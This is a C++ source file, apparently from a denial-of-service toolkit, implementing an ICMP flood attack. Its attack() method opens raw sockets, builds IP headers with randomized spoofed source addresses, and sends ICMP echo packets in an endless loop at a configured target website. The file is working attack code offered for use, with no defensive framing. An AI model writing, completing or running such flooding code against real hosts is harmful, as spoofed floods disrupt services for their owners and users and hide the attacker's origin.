#include <unistd.h>
#include <netinet/in.h>
#include <memory.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>

#include "ICMP_Flood.hpp"
#include "Randomizer.hpp"

void ICMP_Flood::attack(const int *id) {
    int s, x, on = 1;
    char buf[400];
    std::string message{};
    // Structs
    auto *ip = (struct iphdr *)buf;
    auto *icmp = (struct icmphdr *)(ip + 1);
    struct hostent *hp;
    struct sockaddr_in dst{};
    while(true){
        for(x = 0;x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0){
                logger->Log("socket() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                logger->Log("setsockopt() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) < 0){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if((ip->saddr = inet_addr(Randomizer::randomIP())) < 0){
                logger->Log("Unable to set random src ip", Logger::Error);
                exit(EXIT_FAILURE);
            }

            // IP Struct
            ip->version = 4;
            ip->ihl = 5;
            ip->tos = 0;
            ip->tot_len = htons(sizeof(buf));
            ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
            ip->frag_off = htons(0x0);
            ip->ttl = 255;
            ip->protocol = IPPROTO_ICMP;
            ip->check = 0;

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            icmp->type = ICMP_ECHO;
            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
            icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
            icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
            icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
            if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
                logger->Log("sendto() error", Logger::Error);
                exit(EXIT_FAILURE);
            }
            close(s);
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}
